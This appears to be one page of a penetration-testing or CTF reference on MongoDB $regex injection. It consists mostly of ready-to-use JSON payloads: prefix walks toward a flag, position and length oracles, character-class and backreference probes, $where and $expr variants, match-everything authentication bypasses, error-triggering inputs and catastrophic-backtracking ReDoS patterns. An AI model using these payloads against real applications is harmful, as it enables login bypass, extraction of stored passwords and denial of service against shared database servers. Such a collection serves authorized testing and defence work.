# `$regex` deep — the extraction engine

## The engine — MongoDB uses PCRE

MongoDB ≥4.0 uses PCRE2; older used PCRE. Lookaheads, backreferences,
atomic groups, possessive quantifiers — all available. The regex is a
STRING in BSON, not a JS regex literal — `/x/` in a JSON body is invalid
JSON; use `{"$regex": "x"}`.

## The operator forms — three spellings

```json
{"pass": {"$regex": "^a"}}
{"pass": {"$regex": "^a", "$options": "i"}}
{"pass": /regex-here/}          — BSON regex literal — shell/driver only, not JSON
{"pass": {"$regex": /re/, "$options": "i"}}
```

## `$options` — the flags

```text
i — case-insensitive
m — multiline (^/$ match line bounds)
s — dotall (. matches \n)
x — extended (whitespace/comments ignored)
u — unicode (implicit, always on)
```

```json
{"pass": {"$regex": "^flag", "$options": "i"}}
{"pass": {"$regex": "^f.l.a.g", "$options": "s"}}
{"pass": {"$regex": "^a$|^b$", "$options": "m"}}
{"pass": {"$regex": " ^ a ", "$options": "x"}}
{"pass": {"$regex": "^FLAG", "$options": "ix"}}
```

## The prefix-walk — `^a` → `^ab` → `^abc`

```json
{"pass": {"$regex": "^a"}}
{"pass": {"$regex": "^ab"}}
{"pass": {"$regex": "^abc"}}
{"pass": {"$regex": "^flag\\{"}}
{"pass": {"$regex": "^flag\\{a"}}
{"pass": {"$regex": "^flag\\{al"}}
{"pass": {"$regex": "^flag\\{al3"}}
{"pass": {"$regex": "^flag\\{al3x"}}
```

In JSON the backslash must be escaped — `\\{` for the literal brace.

## The position-oracle — `^.{N}c`

```json
{"pass": {"$regex": "^.{0}a"}}
{"pass": {"$regex": "^.{1}a"}}
{"pass": {"$regex": "^.{2}a"}}
{"pass": {"$regex": "^.{3}a"}}
{"pass": {"$regex": "^.{4}a"}}
{"pass": {"$regex": "^.{5}a"}}
{"pass": {"$regex": "^.{10}a"}}
{"pass": {"$regex": "^.{20}a"}}
{"pass": {"$regex": "^.{31}a"}}
{"pass": {"$regex": "^.a"}}
{"pass": {"$regex": "^..a"}}
{"pass": {"$regex": "^.{0,5}a"}}
{"pass": {"$regex": "^.{0,}a"}}
```

## The length-oracle — `^.{N}$`

```json
{"pass": {"$regex": "^.{1}$"}}
{"pass": {"$regex": "^.{8}$"}}
{"pass": {"$regex": "^.{12}$"}}
{"pass": {"$regex": "^.{16}$"}}
{"pass": {"$regex": "^.{20}$"}}
{"pass": {"$regex": "^.{24}$"}}
{"pass": {"$regex": "^.{32}$"}}
{"pass": {"$regex": "^.{40}$"}}
{"pass": {"$regex": "^.{64}$"}}
{"pass": {"$regex": "^.{128}$"}}
{"pass": {"$regex": "^.{1,10}$"}}
{"pass": {"$regex": "^.{20,}$"}}
{"pass": {"$regex": "^.{50,100}$"}}
{"pass": {"$regex": "^.{0,}$"}}
{"pass": {"$regex": "^.{1,}$"}}
{"pass": {"$regex": "^.$"}}
{"pass": {"$regex": "^.{24}$", "$options": "m"}}
```

## The char-class — `^[a-f]` / `^[0-9]`

```json
{"pass": {"$regex": "^[a-f]"}}
{"pass": {"$regex": "^[0-9]"}}
{"pass": {"$regex": "^[a-f0-9]"}}
{"pass": {"$regex": "^[a-z0-9_-]"}}
{"pass": {"$regex": "^[A-Za-z0-9]"}}
{"pass": {"$regex": "^[A-Fa-f0-9]{24}$"}}
{"pass": {"$regex": "^\\w"}}
{"pass": {"$regex": "^\\d"}}
{"pass": {"$regex": "^\\W"}}
{"pass": {"$regex": "^\\D"}}
{"pass": {"$regex": "^\\s"}}
{"pass": {"$regex": "^\\S"}}
{"pass": {"$regex": "^[^0-9]"}}
{"pass": {"$regex": "^[^a-z]"}}
{"pass": {"$regex": "^[^a-f0-9]"}}
{"pass": {"$regex": "^[\\x61-\\x66]"}}
{"pass": {"$regex": "^[\\u0061-\\u0066]"}}
```

## The alternation — `^(a|b|c)`

```json
{"pass": {"$regex": "^(a|b)"}}
{"pass": {"$regex": "^(a|b|c|d|e|f)"}}
{"pass": {"$regex": "^(ab|cd)"}}
{"pass": {"$regex": "^(flag|ctf|htb)"}}
{"pass": {"$regex": "^((a|b)(c|d))"}}
{"pass": {"$regex": "(a|b){2}"}}
```

## The group-oracle — multi-char classes

```json
{"pass": {"$regex": "^a[0-9]"}}
{"pass": {"$regex": "^[a-z][0-9]"}}
{"pass": {"$regex": "^[a-f0-9]{24}$"}}
{"pass": {"$regex": "^flag\\{[a-z0-9_]+\\}$"}}
{"pass": {"$regex": "^flag\\{[a-z0-9_-]{20}\\}$"}}
{"pass": {"$regex": "^[a-z0-9_]{0,10}$"}}
{"pass": {"$regex": "^(.)(.)(.)"}}
{"pass": {"$regex": "^a.{3}b"}}
```

## The lookahead — ReDoS-side

```json
{"pass": {"$regex": "^(?=a)a"}}
{"pass": {"$regex": "^(?!a)b"}}
{"pass": {"$regex": "^(?=.*a)(?=.*b).*"}}
{"pass": {"$regex": "^(a+)+$"}}
{"pass": {"$regex": "^(x+x+)+y"}}
```

`(a+)+` / `(x+x+)+y` — catastrophic backtracking — a ReDoS on the mongo
server — a shared-instance hazard, record `denied` for DoS-shaped
requests unless authorized — `denied-conditions.md`.

## The backreference — the pair-check

```json
{"pass": {"$regex": "^(.)\\1"}}
{"pass": {"$regex": "^(a|b)\\1"}}
{"pass": {"$regex": "(.)\\1{3}"}}
{"pass": {"$regex": "^(\\w)\\1\\1"}}
```

`^(.)\\1` — first two chars equal — the pair-detection oracle.

## The `$where`+regex — the JS regex

```json
{"user": {"$where": "this.pass.match(/^a/)"}}
{"user": {"$where": "this.pass.match(/^.{20}$/)"}}
{"user": {"$where": "/^a/.test(this.pass)"}}
{"user": {"$where": "RegExp('^a').test(this.pass)"}}
{"user": {"$where": "this.pass.search('^a') == 0"}}
{"user": {"$where": "this.pass.replace(/^a/, '') != this.pass"}}
```

`operators-js.md` — the `$where` needs `enableJs`.

## The `$expr`+regex — `$regexMatch`

```json
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a", "options": "i"}}}
{"$expr": {"$regexFind": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$regexFindAll": {"input": "$pass", "regex": "[a-f]"}}}
{"$expr": {"$eq": [{"$regexMatch": {"input": "$p", "regex": "^a"}}, true]}}
{"$expr": {"$regexMatch": {"input": "$p", "regex": "^.{N}c"}}}
{"$expr": {"$regexMatch": {"input": "$p", "regex": "^.{N}$"}}}
{"$expr": {"$regexMatch": {"input": {"$substrCP": ["$p", 0, 1]}, "regex": "a"}}}
{"$expr": {"$regexMatch": {"input": "$p", "regex": {"toString": "x"}}}}
```

`operators-aggregation.md`.

## The index-bypass — `^` uses the index

`^prefix` can use an index; `.*prefix`/`substring` cannot — the scan
difference is itself observable on a slow-enough collection — an
inconclusive timing signal, not proof.

## The `""`-match — the empty-string

```json
{"pass": {"$regex": ""}}
{"pass": {"$regex": "^"}}
{"pass": {"$regex": "^$"}}
{"pass": {"$regex": ".*"}}
{"pass": {"$regex": "^.*$"}}
{"pass": {"$regex": "(?i)"}}
{"pass": {"$regex": "(a?)*"}}
```

`""`/`"^"`/`".*"` match every string — the total-bypass.

## The invalid-regex — the error-oracle

```json
{"pass": {"$regex": "("}}
{"pass": {"$regex": "["}}
{"pass": {"$regex": "*a"}}
{"pass": {"$regex": "\\"}}
{"pass": {"$regex": "a{"}}
{"pass": {"$regex": "(?<"}}
```

An unclosed group → `MongoServerError: $regex has to be a string` or
`invalid regular expression` — the error proves the value reached the
engine — `error-analysis.md`.
